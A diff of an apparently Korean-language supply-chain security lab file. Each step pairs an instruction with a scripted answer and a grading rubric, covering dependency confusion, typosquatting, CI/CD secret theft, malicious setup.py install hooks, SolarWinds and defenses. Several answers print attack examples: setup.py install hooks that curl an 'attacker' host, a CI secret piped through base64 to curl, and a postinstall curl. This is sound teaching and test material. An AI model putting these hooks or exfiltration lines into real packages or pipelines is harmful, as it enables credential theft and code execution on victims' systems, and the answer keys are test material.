@@ -17,218 +17,514 @@ steps:
   hint: pip list --outdated 또는 pip-audit로 취약한 패키지를 탐지한다
   category: recon
   points: 10
-  answer: 'echo ''=== Dependency Analysis ==='' && pip list 2>/dev/null | head -20 && echo ''---'' && echo ''Checking for outdated packages:'' && pip list --outdated 2>/dev/null | head -10 && echo ''---''
-    && echo ''pip-audit (if available):'' && pip-audit 2>/dev/null | head -10 || echo ''pip-audit not installed'' && echo '''' && echo ''Supply chain risk: outdated packages may have known CVEs'''
-  answer_detail: 의존성 분석은 공급망 공격의 첫 단계이다. 오래된 패키지는 알려진 취약점(CVE)을 포함할 수 있고, pip-audit, npm audit, snyk 등의 도구로 자동 탐지할 수 있다. 직접 의존성뿐만 아니라 전이적 의존성(transitive dependencies)도 분석해야 한다.
+  answer: 'echo ''=== Dependency Analysis ==='' && pip list 2>/dev/null | head -20 && echo ''---'' &&
+    echo ''Checking for outdated packages:'' && pip list --outdated 2>/dev/null | head -10 && echo ''---''
+    && echo ''pip-audit (if available):'' && pip-audit 2>/dev/null | head -10 || echo ''pip-audit not
+    installed'' && echo '''' && echo ''Supply chain risk: outdated packages may have known CVEs'''
+  answer_detail: 의존성 분석은 공급망 공격의 첫 단계이다. 오래된 패키지는 알려진 취약점(CVE)을 포함할 수 있고, pip-audit, npm audit, snyk 등의
+    도구로 자동 탐지할 수 있다. 직접 의존성뿐만 아니라 전이적 의존성(transitive dependencies)도 분석해야 한다.
   verify:
     type: output_contains
     expect: Dependency Analysis
     field: stdout
+    semantic:
+      intent: 의존성 분석 — pip list + pip list --outdated + pip-audit/npm audit/snyk. 직접 + 전이적(transitive)
+        의존성 분석. CVE 매핑. OWASP Top 10 2021 A06 Vulnerable and Outdated Components. MITRE T1195 Supply Chain
+        Compromise.
+      success_criteria:
+      - Dependency Analysis 키워드
+      - pip list + outdated 검사
+      - 취약 패키지 도구 (pip-audit/snyk) 언급
+      acceptable_methods:
+      - pip list/pip-audit
+      - npm audit
+      - snyk test / OWASP Dependency-Check
+      negative_signs:
+      - 취약점 도구 없음
+      - outdated 검사 없음
+      - 전이 의존성 맥락 없음
   target_vm: attacker
 - order: 2
   instruction: 의존성 혼동(Dependency Confusion) 공격의 원리를 분석하라. 내부 패키지명과 동일한 공개 패키지를 통한 공격을 시뮬레이션하라.
   hint: 내부 패키지 레지스트리와 공개 레지스트리의 우선순위 차이를 악용한다
   category: exploit
   points: 10
-  answer: 'echo -e ''=== Dependency Confusion Attack ===\n\n[Concept]\n1. Target org uses internal package: "mycompany-utils" v1.0\n2. Attacker publishes "mycompany-utils" v99.0 on PyPI/npm\n3. Build system
-    resolves public v99.0 > internal v1.0\n4. Malicious code executes during install\n\n[Attack Steps]\n1. Enumerate internal package names (job postings, GitHub, error messages)\n2. Register same name
-    on public registry with higher version\n3. Add post-install script with reverse shell\n4. Wait for target CI/CD to pull the package\n\n[Example setup.py]\nfrom setuptools import setup\nimport os\nos.system("curl
-    http://attacker/callback?pkg=mycompany-utils")\nsetup(name="mycompany-utils", version="99.0")\n\n[Defense]\n- Pin exact versions in requirements\n- Use --index-url (not --extra-index-url)\n- Scope namespacing
+  answer: 'echo -e ''=== Dependency Confusion Attack ===\n\n[Concept]\n1. Target org uses internal package:
+    "mycompany-utils" v1.0\n2. Attacker publishes "mycompany-utils" v99.0 on PyPI/npm\n3. Build system
+    resolves public v99.0 > internal v1.0\n4. Malicious code executes during install\n\n[Attack Steps]\n1.
+    Enumerate internal package names (job postings, GitHub, error messages)\n2. Register same name on
+    public registry with higher version\n3. Add post-install script with reverse shell\n4. Wait for target
+    CI/CD to pull the package\n\n[Example setup.py]\nfrom setuptools import setup\nimport os\nos.system("curl
+    http://attacker/callback?pkg=mycompany-utils")\nsetup(name="mycompany-utils", version="99.0")\n\n[Defense]\n-
+    Pin exact versions in requirements\n- Use --index-url (not --extra-index-url)\n- Scope namespacing
     (@company/package)\n- Artifactory/Nexus with proxy rules'''
-  answer_detail: 의존성 혼동은 2021년 Alex Birsan이 발견한 공격으로, Apple, Microsoft, PayPal 등 35개 이상의 기업에 영향을 미쳤다. 빌드 시스템이 내부와 공개 레지스트리를 모두 참조할 때, 높은 버전 번호의 공개 패키지가 우선 설치된다. --index-url로 단일 레지스트리만 사용하는 것이 방어의 핵심이다.
+  answer_detail: 의존성 혼동은 2021년 Alex Birsan이 발견한 공격으로, Apple, Microsoft, PayPal 등 35개 이상의 기업에 영향을 미쳤다.
+    빌드 시스템이 내부와 공개 레지스트리를 모두 참조할 때, 높은 버전 번호의 공개 패키지가 우선 설치된다. --index-url로 단일 레지스트리만 사용하는 것이 방어의 핵심이다.
   verify:
     type: output_contains
     expect: Dependency Confusion
     field: stdout
+    semantic:
+      intent: 'Dependency Confusion — Alex Birsan 2021 (Apple/MS/PayPal 등 35+). 내부 패키지명 동일 + 높은 버전 공개
+        게시 → --extra-index-url 시 공개 우선. setup.py에 post-install curl 콜백. 방어: --index-url 단일 + scope namespacing(@company/)
+        + Artifactory 프록시 룰. MITRE T1195.001.'
+      success_criteria:
+      - Dependency Confusion 키워드
+      - 공격 단계 (열거→게시→실행)
+      - 방어 (--index-url + scope) 언급
+      acceptable_methods:
+      - dependency-confusion 시뮬
+      - JFrog Xray 정책
+      - GitHub Packages scope
+      negative_signs:
+      - 공격 원리 없음
+      - 버전 우선 맥락 없음
+      - 방어 없음
   target_vm: attacker
 - order: 3
   instruction: 타이포스쿼팅(Typosquatting) 공격을 분석하라. 인기 패키지와 유사한 이름의 악성 패키지를 탐지하는 방법을 보여라.
   hint: requests → reqeusts, urllib3 → urllib4 등 일반적인 오타 패턴을 분석한다
   category: exploit
   points: 10
-  answer: 'echo -e ''=== Typosquatting Attack ===\n\n[Common Typo Patterns]\nOriginal       | Typosquatted\nrequests       | reqeusts, request, requets\nurllib3        | urllib4, urlib3, urllib33\nnumpy          |
-    numby, numppy, num-py\npandas         | panda, pandsa, pandass\n\n[Generation techniques]\n1. Character swap: requests -> reqeusts\n2. Missing char: requests -> reqests\n3. Extra char: requests -> requestss\n4.
-    Similar char: requests -> reguests\n5. Version suffix: requests2, requests3\n\n[Detection]\npip install safety\nsafety check  # Check installed packages\n\n[Real incidents]\n- colourama (typo of colorama):
-    Stole crypto wallets\n- python3-dateutil: Contained crypto stealer\n- jeIlyfish (with capital I): Stole SSH keys\n\n[Defense]\n- Verify package name spelling before install\n- Use hash pinning in requirements\n-
-    Package provenance verification (Sigstore)'''
-  answer_detail: 타이포스쿼팅은 개발자의 오타를 악용하여 악성 패키지를 설치하게 하는 공격이다. colourama 사건은 colorama의 오타로 암호화폐 지갑을 탈취했고, jeIlyfish는 대문자 I로 l을 대체하여 SSH 키를 탈취했다. Sigstore의 코드 서명과 SLSA(Supply chain Levels for Software Artifacts)
+  answer: 'echo -e ''=== Typosquatting Attack ===\n\n[Common Typo Patterns]\nOriginal       | Typosquatted\nrequests       |
+    reqeusts, request, requets\nurllib3        | urllib4, urlib3, urllib33\nnumpy          | numby, numppy,
+    num-py\npandas         | panda, pandsa, pandass\n\n[Generation techniques]\n1. Character swap: requests
+    -> reqeusts\n2. Missing char: requests -> reqests\n3. Extra char: requests -> requestss\n4. Similar
+    char: requests -> reguests\n5. Version suffix: requests2, requests3\n\n[Detection]\npip install safety\nsafety
+    check  # Check installed packages\n\n[Real incidents]\n- colourama (typo of colorama): Stole crypto
+    wallets\n- python3-dateutil: Contained crypto stealer\n- jeIlyfish (with capital I): Stole SSH keys\n\n[Defense]\n-
+    Verify package name spelling before install\n- Use hash pinning in requirements\n- Package provenance
+    verification (Sigstore)'''
+  answer_detail: 타이포스쿼팅은 개발자의 오타를 악용하여 악성 패키지를 설치하게 하는 공격이다. colourama 사건은 colorama의 오타로 암호화폐 지갑을 탈취했고,
+    jeIlyfish는 대문자 I로 l을 대체하여 SSH 키를 탈취했다. Sigstore의 코드 서명과 SLSA(Supply chain Levels for Software Artifacts)
     프레임워크가 방어 표준으로 부상하고 있다.
   verify:
     type: output_contains
     expect: Typosquatting
     field: stdout
+    semantic:
+      intent: 'Typosquatting — requests/reqeusts, urllib3/urllib4, jeIlyfish(I=l). 사례: colourama(crypto
+        wallet 탈취) + python3-dateutil(crypto stealer) + jeIlyfish(SSH 키 탈취). 방어: 철자 확인 + 해시 핀 + Sigstore.
+        SLSA 프레임워크. MITRE T1195.002.'
+      success_criteria:
+      - Typosquatting 키워드
+      - 오타 패턴 4개 이상
+      - 실 사례 (colourama/jeIlyfish 등)
+      acceptable_methods:
+      - 수동 패턴 비교
+      - safety check
+      - Socket.dev 자동 분석
+      negative_signs:
+      - 사례 없음
+      - Sigstore 누락
+      - 패턴 2개 이하
   target_vm: attacker
 - order: 4
   instruction: CI/CD 파이프라인 공격을 분석하라. GitHub Actions 워크플로우의 보안 취약점을 식별하고 악용하는 시나리오를 구성하라.
   hint: workflow_run, pull_request_target 트리거의 위험성과 시크릿 유출 경로를 분석한다
   category: exploit
   points: 10
-  answer: echo -e '=== CI/CD Pipeline Attacks ===\n\n[GitHub Actions Vulnerabilities]\n\n1. pull_request_target with checkout\n- Runs with repo write access + secrets\n- Attacker PR code executes with elevated
-    privileges\n\n2. Poisoned Pipeline Execution (PPE)\n- Modify CI config in PR (.github/workflows/)\n- Inject malicious steps\n\n3. Secret Extraction\n- echo \${{ secrets.TOKEN }} | base64 | curl attacker\n-
-    Secrets visible in forked repo actions\n\n4. Artifact Poisoning\n- Replace build artifacts with trojaned versions\n- actions/upload-artifact -> download-artifact chain\n\n5. Self-hosted Runner Exploitation\n-
-    Persistent access after workflow\n- Access to runner credentials and network\n\n[Defense]\n- Restrict workflow permissions (read-only default)\n- Pin actions to SHA (not tags)\n- Use OpenID Connect
-    (OIDC) for cloud access\n- Ephemeral self-hosted runners\n- Required reviews for workflow changes'
-  answer_detail: CI/CD 파이프라인은 코드를 자동으로 빌드/배포하므로 공격 시 전체 소프트웨어 공급망에 영향을 미친다. pull_request_target 트리거는 시크릿에 접근하면서 외부 PR 코드를 실행하는 위험한 패턴이다. 액션을 SHA로 고정하고, 최소 권한 원칙을 적용하며, OIDC로 장기 자격증명을 제거하는 것이 핵심 방어이다.
+  answer: echo -e '=== CI/CD Pipeline Attacks ===\n\n[GitHub Actions Vulnerabilities]\n\n1. pull_request_target
+    with checkout\n- Runs with repo write access + secrets\n- Attacker PR code executes with elevated
+    privileges\n\n2. Poisoned Pipeline Execution (PPE)\n- Modify CI config in PR (.github/workflows/)\n-
+    Inject malicious steps\n\n3. Secret Extraction\n- echo \${{ secrets.TOKEN }} | base64 | curl attacker\n-
+    Secrets visible in forked repo actions\n\n4. Artifact Poisoning\n- Replace build artifacts with trojaned
+    versions\n- actions/upload-artifact -> download-artifact chain\n\n5. Self-hosted Runner Exploitation\n-
+    Persistent access after workflow\n- Access to runner credentials and network\n\n[Defense]\n- Restrict
+    workflow permissions (read-only default)\n- Pin actions to SHA (not tags)\n- Use OpenID Connect (OIDC)
+    for cloud access\n- Ephemeral self-hosted runners\n- Required reviews for workflow changes'
+  answer_detail: CI/CD 파이프라인은 코드를 자동으로 빌드/배포하므로 공격 시 전체 소프트웨어 공급망에 영향을 미친다. pull_request_target 트리거는 시크릿에
+    접근하면서 외부 PR 코드를 실행하는 위험한 패턴이다. 액션을 SHA로 고정하고, 최소 권한 원칙을 적용하며, OIDC로 장기 자격증명을 제거하는 것이 핵심 방어이다.
   verify:
     type: output_contains
     expect: CI/CD Pipeline
     field: stdout
+    semantic:
+      intent: 'CI/CD 공격 — [1] pull_request_target + checkout (write + secrets 노출) + [2] PPE Poisoned Pipeline
+        + [3] secret 추출 (echo $TOKEN | base64 | curl) + [4] artifact poisoning + [5] self-hosted runner.
+        방어: 최소 권한 + SHA 핀 + OIDC + ephemeral runner + 워크플로 변경 리뷰. MITRE T1195.002.'
+      success_criteria:
+      - CI/CD Pipeline 키워드
+      - 공격 4개 이상
+      - 방어 (SHA 핀/OIDC/최소 권한) 명시
+      acceptable_methods:
+      - GitHub Actions 보안 분석
+      - GitLab CI/CD 변형
+      - Jenkins / CircleCI 적용
+      negative_signs:
+      - 공격 2개 이하
+      - 방어 없음
+      - GitHub Actions 미언급
   target_vm: attacker
 - order: 5
   instruction: 악성 패키지의 설치 후 코드 실행(Post-install Hook) 기법을 분석하라. setup.py의 install 명령을 재정의하는 예제를 작성하라.
   hint: setup.py의 cmdclass로 install 명령을 오버라이드하여 임의 코드를 실행한다
   category: exploit
   points: 10
-  answer: "cat > /tmp/malicious_setup.py << 'PYEOF'\n# WARNING: Educational purpose only\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport subprocess\n\nclass PostInstallCommand(install):\n\
-    \    def run(self):\n        # Malicious code executes during pip install\n        subprocess.call(['curl', '-s', 'http://attacker/callback'])\n        install.run(self)\n\nsetup(\n    name='legitimate-looking-package',\n\
-    \    version='1.0.0',\n    description='Totally safe package',\n    cmdclass={'install': PostInstallCommand},\n)\nPYEOF\necho '=== Malicious setup.py ===' && cat /tmp/malicious_setup.py && echo '' &&\
-    \ echo 'Executes during: pip install legitimate-looking-package' && rm /tmp/malicious_setup.py"
-  answer_detail: Python의 setup.py는 패키지 설치 시 임의 코드를 실행할 수 있다. cmdclass를 재정의하면 pip install 시 자동으로 공격 코드가 실행된다. npm의 preinstall/postinstall 스크립트, Ruby의 extconf.rb도 같은 위험이 있다. PEP 517/518의 pyproject.toml 기반
+  answer: "cat > /tmp/malicious_setup.py << 'PYEOF'\n# WARNING: Educational purpose only\nfrom setuptools\
+    \ import setup\nfrom setuptools.command.install import install\nimport subprocess\n\nclass PostInstallCommand(install):\n\
+    \    def run(self):\n        # Malicious code executes during pip install\n        subprocess.call(['curl',\
+    \ '-s', 'http://attacker/callback'])\n        install.run(self)\n\nsetup(\n    name='legitimate-looking-package',\n\
+    \    version='1.0.0',\n    description='Totally safe package',\n    cmdclass={'install': PostInstallCommand},\n\
+    )\nPYEOF\necho '=== Malicious setup.py ===' && cat /tmp/malicious_setup.py && echo '' && echo 'Executes\
+    \ during: pip install legitimate-looking-package' && rm /tmp/malicious_setup.py"
+  answer_detail: Python의 setup.py는 패키지 설치 시 임의 코드를 실행할 수 있다. cmdclass를 재정의하면 pip install 시 자동으로 공격 코드가
+    실행된다. npm의 preinstall/postinstall 스크립트, Ruby의 extconf.rb도 같은 위험이 있다. PEP 517/518의 pyproject.toml 기반
     빌드가 더 안전하다.
   verify:
     type: output_contains
     expect: Malicious setup.py
     field: stdout
+    semantic:
+      intent: '악성 setup.py — class PostInstallCommand(install): def run(self): subprocess.call([''curl'',
+        ''http://attacker/callback'']); install.run(self) + cmdclass={''install'': PostInstallCommand}.
+        pip install 시 자동 실행. npm preinstall/postinstall + Ruby extconf.rb 동일. PEP 517/518 pyproject.toml
+        더 안전. CWE-829.'
+      success_criteria:
+      - Malicious setup.py 키워드
+      - cmdclass + install 재정의
+      - subprocess/system 실행
+      acceptable_methods:
+      - setup.py cmdclass
+      - npm package.json scripts
+      - Ruby extconf.rb
+      negative_signs:
+      - cmdclass 없음
+      - 실행 메커니즘 없음
+      - PEP 517 대안 누락
   target_vm: attacker
 - order: 6
   instruction: SolarWinds 공격(SUNBURST)의 공격 체인을 분석하고, 핵심 기법을 정리하라.
   hint: 빌드 프로세스 침해, 코드 삽입, 백도어 배포, C2 통신의 각 단계를 분석한다
   category: analysis
   points: 10
-  answer: 'echo -e ''=== SolarWinds SUNBURST Analysis ===\n\n[Attack Chain]\n1. Initial Access: SolarWinds build server compromise\n2. Code Injection: Malicious code inserted into Orion DLL\n3. Build Compromise:
-    Signed with legitimate SolarWinds cert\n4. Distribution: Pushed via official update channel\n5. Dormancy: 12-14 day sleep before activation\n6. C2: DNS-based beaconing (avsvmcloud.com)\n7. Lateral Movement:
-    SAML token forging (GoldenSAML)\n8. Data Exfil: Targeted, selective data collection\n\n[Key Techniques]\n- Build process injection (not source repo)\n- DGA (Domain Generation Algorithm) for C2\n- Anti-analysis:
-    Check for security tools before activating\n- Blended with normal SolarWinds traffic\n\n[Impact]\n- 18,000+ organizations received malicious update\n- 100+ actively exploited (US gov agencies, Fortune
-    500)\n\n[Lessons]\n- Code signing alone is insufficient\n- Build pipeline security is critical\n- Zero trust for internal networks\n- SBOM (Software Bill of Materials) needed'''
-  answer_detail: SolarWinds SUNBURST(2020)는 역사상 가장 정교한 공급망 공격이다. 러시아 SVR(APT29)이 빌드 서버를 침해하여 합법적으로 서명된 업데이트에 백도어를 삽입했다. 12일 대기 후 DNS 기반 C2를 활성화하고, GoldenSAML로 클라우드 환경을 장악했다. 이후 SBOM, SLSA, 빌드 무결성 검증이 업계
+  answer: 'echo -e ''=== SolarWinds SUNBURST Analysis ===\n\n[Attack Chain]\n1. Initial Access: SolarWinds
+    build server compromise\n2. Code Injection: Malicious code inserted into Orion DLL\n3. Build Compromise:
+    Signed with legitimate SolarWinds cert\n4. Distribution: Pushed via official update channel\n5. Dormancy:
+    12-14 day sleep before activation\n6. C2: DNS-based beaconing (avsvmcloud.com)\n7. Lateral Movement:
+    SAML token forging (GoldenSAML)\n8. Data Exfil: Targeted, selective data collection\n\n[Key Techniques]\n-
+    Build process injection (not source repo)\n- DGA (Domain Generation Algorithm) for C2\n- Anti-analysis:
+    Check for security tools before activating\n- Blended with normal SolarWinds traffic\n\n[Impact]\n-
+    18,000+ organizations received malicious update\n- 100+ actively exploited (US gov agencies, Fortune
+    500)\n\n[Lessons]\n- Code signing alone is insufficient\n- Build pipeline security is critical\n-
+    Zero trust for internal networks\n- SBOM (Software Bill of Materials) needed'''
+  answer_detail: SolarWinds SUNBURST(2020)는 역사상 가장 정교한 공급망 공격이다. 러시아 SVR(APT29)이 빌드 서버를 침해하여 합법적으로 서명된
+    업데이트에 백도어를 삽입했다. 12일 대기 후 DNS 기반 C2를 활성화하고, GoldenSAML로 클라우드 환경을 장악했다. 이후 SBOM, SLSA, 빌드 무결성 검증이 업계
     표준으로 부상했다.
   verify:
     type: output_contains
     expect: SolarWinds
     field: stdout
+    semantic:
+      intent: 'SolarWinds SUNBURST — APT29 SVR 2020. 1) 빌드 서버 침해 → 2) Orion DLL 코드 주입 → 3) 합법 SolarWinds
+        인증서 서명 → 4) 공식 업데이트 배포 → 5) 12-14일 dormancy → 6) DNS C2 (avsvmcloud.com DGA) → 7) GoldenSAML SAML
+        토큰 위조 → 8) 선별 데이터 유출. 18,000+ 기관 영향, 100+ 활동 익스플로잇. 교훈: 코드 서명만으로 부족 + SBOM/SLSA/제로 트러스트.'
+      success_criteria:
+      - SolarWinds 키워드
+      - 공격 체인 5단계 이상
+      - 교훈 (SBOM/SLSA) 언급
+      acceptable_methods:
+      - MITRE ATT&CK G0016 APT29
+      - Mandiant SUNBURST 보고서
+      - CISA AA20-352A
+      negative_signs:
+      - 체인 단계 부족
+      - GoldenSAML 누락
+      - 교훈 없음
   target_vm: attacker
 - order: 7
   instruction: 코드 서명 검증을 분석하라. GPG 서명 확인, 해시 검증, Sigstore를 통한 패키지 무결성 확인 방법을 실습하라.
   hint: sha256sum, gpg --verify, cosign 등의 도구를 사용한다
   category: defense
   points: 10
-  answer: echo '=== Code Signing & Verification ===' && echo '[SHA256 Hash Verification]' && echo 'test content' > /tmp/signed_file.txt && sha256sum /tmp/signed_file.txt && echo '' && echo '[GPG Signing
-    (concept)]' && echo 'gpg --sign --armor file -> file.asc' && echo 'gpg --verify file.asc file -> Good signature from...' && echo '' && echo '[Sigstore/cosign]' && echo 'cosign sign --key cosign.key
-    image:tag' && echo 'cosign verify --key cosign.pub image:tag' && echo '' && echo '[SLSA Provenance]' && echo 'slsa-verifier verify-artifact binary --source-uri github.com/org/repo' && echo '' && echo
-    '[pip download verification]' && echo 'pip install --require-hashes -r requirements.txt' && rm /tmp/signed_file.txt
-  answer_detail: 코드 서명은 소프트웨어의 출처와 무결성을 보장한다. GPG는 전통적인 PGP 서명, Sigstore/cosign은 키리스(keyless) 서명으로 컨테이너 이미지의 무결성을 검증한다. SLSA(Supply-chain Levels for Software Artifacts)는 빌드 프로세스 자체의 무결성을 보장하는 프레임워크이다.
+  answer: echo '=== Code Signing & Verification ===' && echo '[SHA256 Hash Verification]' && echo 'test
+    content' > /tmp/signed_file.txt && sha256sum /tmp/signed_file.txt && echo '' && echo '[GPG Signing
+    (concept)]' && echo 'gpg --sign --armor file -> file.asc' && echo 'gpg --verify file.asc file -> Good
+    signature from...' && echo '' && echo '[Sigstore/cosign]' && echo 'cosign sign --key cosign.key image:tag'
+    && echo 'cosign verify --key cosign.pub image:tag' && echo '' && echo '[SLSA Provenance]' && echo
+    'slsa-verifier verify-artifact binary --source-uri github.com/org/repo' && echo '' && echo '[pip download
+    verification]' && echo 'pip install --require-hashes -r requirements.txt' && rm /tmp/signed_file.txt
+  answer_detail: 코드 서명은 소프트웨어의 출처와 무결성을 보장한다. GPG는 전통적인 PGP 서명, Sigstore/cosign은 키리스(keyless) 서명으로 컨테이너
+    이미지의 무결성을 검증한다. SLSA(Supply-chain Levels for Software Artifacts)는 빌드 프로세스 자체의 무결성을 보장하는 프레임워크이다.
   verify:
     type: output_contains
-    expect: Code Signing
+    expect:
+    - Code Signing
+    - GPG
     field: stdout
+    semantic:
+      intent: 코드 서명 검증 — sha256sum 해시 + gpg --verify file.asc + cosign sign/verify --key + slsa-verifier
+        verify-artifact + pip install --require-hashes -r req. Sigstore 키리스 서명. SLSA Provenance. RFC 9162
+        Certificate Transparency.
+      success_criteria:
+      - Code Signing 키워드 또는 GPG
+      - 검증 도구 3개 이상 (sha256/gpg/cosign/slsa-verifier)
+      - Sigstore 또는 SLSA 언급
+      acceptable_methods:
+      - sha256sum + gpg + cosign
+      - minisign
+      - Sigstore Rekor 투명성 로그
+      negative_signs:
+      - 서명 검증 없음
+      - Sigstore 누락
+      - 도구 1개 이하
   target_vm: attacker
 - order: 8
   instruction: Docker 이미지 공급망 공격을 분석하라. 악성 베이스 이미지, 레이어 주입, 레지스트리 공격을 설명하라.
   hint: Docker Hub의 공개 이미지 위험성과 프라이빗 레지스트리 보안을 다룬다
   category: exploit
   points: 10
-  answer: 'echo -e ''=== Container Supply Chain Attacks ===\n\n[1] Malicious Base Images\n- Trojaned popular images on Docker Hub\n- Cryptominers in official-looking images\n- Example: docker pull mysql
-    (typo: mysqll)\n\n[2] Layer Injection\n- Modify intermediate layers\n- Add backdoor in multi-stage build\n\n[3] Registry Attacks\n- Man-in-the-middle on registry pull\n- Compromised registry credentials\n-
-    Tag mutation (same tag, different content)\n\n[4] Dockerfile Risks\n- curl | bash in RUN instructions\n- Hardcoded secrets in ENV/ARG\n- Running as root without USER directive\n\n[Defense]\n- Use verified/official
-    base images only\n- Pin images by SHA256 digest (not tag)\n- Scan images: trivy, grype, snyk container\n- Sign images with cosign/notary\n- Minimal images (distroless, scratch)\n- Read-only root filesystem'''
-  answer_detail: 컨테이너 공급망 공격은 Docker 이미지의 각 단계를 타겟으로 한다. 악성 베이스 이미지, 빌드 중 주입, 레지스트리 변조 등이 가능하다. 태그는 변경될 수 있으므로 SHA256 다이제스트로 고정해야 한다. Trivy, Grype로 이미지 스캔, cosign으로 서명을 검증하는 것이 현대적 방어 패턴이다.
+  answer: 'echo -e ''=== Container Supply Chain Attacks ===\n\n[1] Malicious Base Images\n- Trojaned popular
+    images on Docker Hub\n- Cryptominers in official-looking images\n- Example: docker pull mysql (typo:
+    mysqll)\n\n[2] Layer Injection\n- Modify intermediate layers\n- Add backdoor in multi-stage build\n\n[3]
+    Registry Attacks\n- Man-in-the-middle on registry pull\n- Compromised registry credentials\n- Tag
+    mutation (same tag, different content)\n\n[4] Dockerfile Risks\n- curl | bash in RUN instructions\n-
+    Hardcoded secrets in ENV/ARG\n- Running as root without USER directive\n\n[Defense]\n- Use verified/official
+    base images only\n- Pin images by SHA256 digest (not tag)\n- Scan images: trivy, grype, snyk container\n-
+    Sign images with cosign/notary\n- Minimal images (distroless, scratch)\n- Read-only root filesystem'''
+  answer_detail: 컨테이너 공급망 공격은 Docker 이미지의 각 단계를 타겟으로 한다. 악성 베이스 이미지, 빌드 중 주입, 레지스트리 변조 등이 가능하다. 태그는 변경될
+    수 있으므로 SHA256 다이제스트로 고정해야 한다. Trivy, Grype로 이미지 스캔, cosign으로 서명을 검증하는 것이 현대적 방어 패턴이다.
   verify:
     type: output_contains
     expect: Container Supply Chain
     field: stdout
+    semantic:
+      intent: '컨테이너 공급망 — [1] 악성 베이스 이미지 (Docker Hub typo: mysqll) + [2] Layer Injection (multi-stage)
+        + [3] Registry MITM + tag mutation + [4] Dockerfile 위험 (curl|bash, hardcoded ENV, root). 방어: 공식
+        이미지 only + SHA256 다이제스트 핀 + Trivy/Grype/Snyk 스캔 + cosign 서명 + distroless/scratch + read-only rootfs.
+        CWE-1357.'
+      success_criteria:
+      - Container Supply Chain 키워드
+      - 공격 4개 이상
+      - 방어 (스캔 + 서명 + 핀) 명시
+      acceptable_methods:
+      - Trivy/Grype + cosign
+      - Snyk Container
+      - Anchore Grype
+      negative_signs:
+      - 공격 2개 이하
+      - 스캐너 없음
+      - 이미지 핀 누락
   target_vm: attacker
 - order: 9
   instruction: SBOM(Software Bill of Materials)을 생성하고 분석하라. 프로젝트의 의존성 트리를 추출하여 위험 패키지를 식별하라.
   hint: pip freeze, pipdeptree, cyclonedx-bom 등으로 SBOM을 생성한다
   category: defense
   points: 10
-  answer: 'echo ''=== SBOM Generation ==='' && pip freeze 2>/dev/null | head -15 && echo ''---'' && echo ''Dependency tree:'' && pipdeptree 2>/dev/null | head -20 || pip freeze 2>/dev/null | head -10 &&
-    echo '''' && echo ''[SBOM Formats]'' && echo ''- SPDX: ISO standard, broad adoption'' && echo ''- CycloneDX: OWASP standard, security-focused'' && echo '''' && echo ''[Tools]'' && echo ''- syft: Container/filesystem
-    SBOM generation'' && echo ''- cyclonedx-bom: CycloneDX format from pip/npm'' && echo ''- grype: Vulnerability scan using SBOM'' && echo '''' && echo ''[Analysis]'' && echo ''syft . -o cyclonedx-json
-    > sbom.json'' && echo ''grype sbom:sbom.json -> list vulnerabilities'''
-  answer_detail: SBOM은 소프트웨어에 포함된 모든 구성 요소의 목록으로, 공급망 투명성의 핵심이다. US Executive Order 14028(2021)에서 연방 소프트웨어에 SBOM을 의무화했다. CycloneDX와 SPDX가 표준 형식이며, syft로 생성하고 grype로 취약점을 스캔하는 것이 일반적인 워크플로우이다.
+  answer: 'echo ''=== SBOM Generation ==='' && pip freeze 2>/dev/null | head -15 && echo ''---'' && echo
+    ''Dependency tree:'' && pipdeptree 2>/dev/null | head -20 || pip freeze 2>/dev/null | head -10 &&
+    echo '''' && echo ''[SBOM Formats]'' && echo ''- SPDX: ISO standard, broad adoption'' && echo ''-
+    CycloneDX: OWASP standard, security-focused'' && echo '''' && echo ''[Tools]'' && echo ''- syft: Container/filesystem
+    SBOM generation'' && echo ''- cyclonedx-bom: CycloneDX format from pip/npm'' && echo ''- grype: Vulnerability
+    scan using SBOM'' && echo '''' && echo ''[Analysis]'' && echo ''syft . -o cyclonedx-json > sbom.json''
+    && echo ''grype sbom:sbom.json -> list vulnerabilities'''
+  answer_detail: SBOM은 소프트웨어에 포함된 모든 구성 요소의 목록으로, 공급망 투명성의 핵심이다. US Executive Order 14028(2021)에서 연방 소프트웨어에
+    SBOM을 의무화했다. CycloneDX와 SPDX가 표준 형식이며, syft로 생성하고 grype로 취약점을 스캔하는 것이 일반적인 워크플로우이다.
   verify:
     type: output_contains
     expect: SBOM
     field: stdout
+    semantic:
+      intent: 'SBOM 생성/분석 — pip freeze + pipdeptree (의존성 트리). 형식: SPDX(ISO) + CycloneDX(OWASP, security-focused).
+        도구: syft (-o cyclonedx-json) + cyclonedx-bom + grype (취약점). US EO 14028 (2021) 연방 SW SBOM 의무화.'
+      success_criteria:
+      - SBOM 키워드
+      - SPDX + CycloneDX 형식 명시
+      - syft + grype 도구
+      acceptable_methods:
+      - syft + grype
+      - cyclonedx-bom + dependency-track
+      - Trivy SBOM 출력
+      negative_signs:
+      - SBOM 형식 없음
+      - 도구 없음
+      - EO 14028 누락
   target_vm: attacker
 - order: 10
   instruction: npm/PyPI 패키지의 pre/post install 스크립트를 분석하라. 설치 시 자동 실행되는 코드를 검사하는 방법을 보여라.
   hint: npm pack으로 패키지를 다운로드하고, package.json의 scripts 섹션을 검사한다
   category: analysis
   points: 10
-  answer: 'echo -e ''=== Package Install Hook Analysis ===\n\n[npm]\nnpm pack <package> -> extract -> check package.json\n"scripts": {\n  "preinstall": "node malicious.js",  <- DANGEROUS\n  "postinstall":
-    "curl attacker.com",  <- DANGEROUS\n  "install": "node-gyp rebuild"       <- Normal (native module)\n}\n\n[Python/pip]\nsetup.py: cmdclass override\nsetup.cfg: [options.entry_points] console_scripts\npyproject.toml:
-    [tool.setuptools.cmdclass]\n\n[Ruby/gem]\ngemspec: extensions (extconf.rb executed during install)\n\n[Detection]\n- npm: npm install --ignore-scripts (safe install)\n- pip: --no-build-isolation --no-deps\n-
-    Review source before install\n- Socket.dev: Real-time package analysis\n- Snyk: Dependency vulnerability scanning'''
-  answer_detail: 패키지 설치 훅은 공급망 공격의 주요 실행 메커니즘이다. npm의 preinstall/postinstall, Python의 setup.py cmdclass, Ruby의 extconf.rb가 대표적이다. --ignore-scripts 옵션으로 훅 실행을 차단할 수 있지만, 일부 패키지는 네이티브 모듈 빌드에 필수적이다. Socket.dev는
+  answer: 'echo -e ''=== Package Install Hook Analysis ===\n\n[npm]\nnpm pack <package> -> extract ->
+    check package.json\n"scripts": {\n  "preinstall": "node malicious.js",  <- DANGEROUS\n  "postinstall":
+    "curl attacker.com",  <- DANGEROUS\n  "install": "node-gyp rebuild"       <- Normal (native module)\n}\n\n[Python/pip]\nsetup.py:
